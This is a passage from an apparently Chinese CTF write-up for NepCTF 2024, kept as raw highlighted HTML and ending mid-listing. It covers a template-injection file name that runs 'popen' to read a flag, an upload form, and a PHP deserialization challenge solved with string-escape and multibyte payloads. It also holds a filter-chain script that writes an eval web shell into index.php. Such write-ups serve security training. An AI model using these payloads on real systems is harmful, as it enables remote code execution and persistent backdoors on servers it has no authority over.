punctuation">&#123;&#123;</span><span class="token string">''</span><span class="token punctuation">.</span><span class="token variable">__class__</span><span class="token punctuation">.</span><span class="token variable">__base__</span><span class="token punctuation">.</span><span class="token function">__subclasses__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token variable">__init__</span><span class="token punctuation">.</span><span class="token variable">__globals__</span><span class="token punctuation">[</span><span class="token string">'popen'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'cd ..;cat flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token delimiter punctuation">&#125;&#125;</span></span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>压缩后上传，自己准备个上传表单</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">HTML</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>本地文件上传<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://neptune-21540.nepctf.lemonprefect.cn/<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>tp_file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>upload<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样子解压后回显的就是flag了（图用的晨曦师傅的）</p><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240831122617710.png" alt="image-20240831122617710"></p><hr><h1 id="PHP-MASTER"><a href="#PHP-MASTER" class="headerlink" title="PHP_MASTER!!"></a>PHP_MASTER!!</h1><p>非预期抢了个3血</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span> <span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"["</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$end</span> <span class="token operator">=</span> <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$start</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token variable">$end</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">-</span> <span class="token variable">$start</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">A</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token operator">===</span> <span class="token string double-quoted-string">"\0key\0"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">B</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__tostring</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\[|\]/i"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nep'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"NONONO!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">substrstr</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nep1'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"[welcome to"</span><span class="token operator">.</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nep'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">"CTF]"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$str</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$str</span><span class="token operator">===</span><span class="token string single-quoted-string">'NepCTF]'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">C</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">s</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span> <span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"00"</span><span class="token punctuation">,</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一眼西瓜杯 Ezzz_php 进阶版</p><p>第一步，字符串逃逸来使 C 中的 str 属性为我们的序列化字符串，<code>%00</code>变为<code>00</code>会增加1位，逃逸<code>&quot;;s:3:&quot;str&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;N;&#125;&#125;&quot;</code>共36位，即重复36遍</p><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token string double-quoted-string">";s:3:"</span>str<span class="token string double-quoted-string">";O:1:"</span><span class="token constant">B</span><span class="token string double-quoted-string">":1:&#123;s:1:"</span>b<span class="token string double-quoted-string">";N;&#125;&#125;"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第二步，宽字节注入</p><blockquote><p>每发送一个<code>%f0abc</code>，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节<br>每发送一个<code>%f0%9fab</code>,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节<br>每发送一个<code>%f0%9f%9fa</code>,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">nep<span class="token operator">=</span>Nep<span class="token operator">&amp;</span>nep1<span class="token operator">=</span><span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>第三步，到了<code>return ($this-&gt;b) ();</code>这里</p><p>故技重施，先读phpinfo()</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>c<span class="token operator">=</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token number">00</span><span class="token string double-quoted-string">";s:3:"</span>str<span class="token string double-quoted-string">";O:1:"</span><span class="token constant">B</span><span class="token string double-quoted-string">":1:&#123;s:1:"</span>b<span class="token string double-quoted-string">";s:7:"</span>phpinfo<span class="token string double-quoted-string">";&#125;&#125;"</span><span class="token operator">&amp;</span>nep<span class="token operator">=</span>Nep<span class="token operator">&amp;</span>nep1<span class="token operator">=</span><span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span class="token operator">%</span>f0<span class="token operator">%</span><span class="token number">9</span>f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/24/NepCTF-2024/image-20240824163621405.png" alt="image-20240824163621405"></p><p>flag在环境变量里，感觉是非预期了</p><h2 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span><span class="token operator">===</span> <span class="token string double-quoted-string">"\0key\0"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$contents</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后是readflag函数，调用方式像这样</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">B</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">C</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">b</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'readflag'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$ser</span><span class="token punctuation">;</span><span class="token comment">// O:1:"C":2:&#123;s:1:"s";s:1:"1";s:3:"str";O:1:"B":1:&#123;s:1:"b";a:2:&#123;i:0;O:1:"A":1:&#123;s:3:"key";N;&#125;i:1;s:8:"readflag";&#125;&#125;&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明显只能在 index.php 里面写马，那就是filterchain了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$base64_payload</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"PD9waHAgQGV2YWwoJF9SRVFVRVNUWydjbWQnXSk7Pz4"</span><span class="token punctuation">;</span> <span class="token comment">/*&lt;?php @eval($_REQUEST['cmd']);?>*/</span><span class="token variable">$conversions</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string single-quoted-string">'/'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'0'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'1'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'2'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'3'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'4'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'5'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'6'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'7'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'8'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'9'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'A'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'B'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'C'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.CSISO2022KR'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'D'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'E'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'F'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'G'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'H'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'I'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'J'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'K'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'L'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'M'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'N'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'O'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'P'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB'</span><span class="token punctuation">,</span>    <span class="token string single-quoted-string">'Q'</span> <span class="token operator">=></span> <span class="token string 